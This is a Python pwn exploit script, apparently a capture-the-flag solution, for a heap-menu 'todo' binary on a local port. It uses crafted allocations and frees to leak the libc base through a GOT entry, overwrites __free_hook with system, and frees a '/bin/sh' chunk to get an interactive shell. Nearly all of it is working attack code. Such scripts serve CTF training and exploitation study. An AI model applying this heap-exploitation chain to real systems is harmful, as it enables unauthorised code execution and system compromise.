from ptrlib import *

def create_todo(topic):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("topic: ")
    sock.sendline(topic)

def edit_todo(topic, desc, length):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("topic: ")
    sock.sendline(topic)
    sock.recvuntil("Desc length: ")
    sock.sendline(str(length))
    sock.recvuntil("Desc: ")
    sock.sendline(desc)

def delete_todo(topic):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("topic: ")
    sock.sendline(topic)

def show_todo(lnum):
    sock.recvuntil("> ")
    sock.sendline("4")
    for i in range(lnum):
        ret = sock.recvline()
    return ret.rstrip()

elf = ELF("./challenge")
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
#sock = Process("./challenge")
sock = Socket("127.0.0.1", 4003)

# leak libc base
fake_todo = b'AAAAAAAA' + p64(elf.got("__libc_start_main"))
create_todo("A" * 0x10)
edit_todo("A" * 0x10, fake_todo, 0x10)
delete_todo("A" * 0x10)
create_todo("B" * 0x40)
create_todo("C" * 0x10)
ret = show_todo(2)
addr = u64(ret[ret.rfind(b" - ") + 3:])
libc_base = addr - libc.symbol("__libc_start_main")
addr_system = libc_base + libc.symbol("system")
addr_free_hook = libc_base + libc.symbol("__free_hook")
dump("libc base = " + hex(libc_base))
assert 0xFFFFFFFF < libc_base

# overwrite __free_hook
create_todo("X" * 0x10)
edit_todo("X" * 0x10, "big todo", 0x30)
delete_todo("X" * 0x10)
create_todo("Y" * 0x10)
delete_todo("Y" * 0x10)
create_todo("Z" * 0x10)
edit_todo("Z" * 0x10, p64(addr_free_hook), 0x30)
create_todo("G" * 0x30)
create_todo("W" * 0x10)
edit_todo("W" * 0x10, p64(addr_system), 0x30)

# get the shell!
create_todo("/bin/sh")
delete_todo("/bin/sh")

sock.interactive()
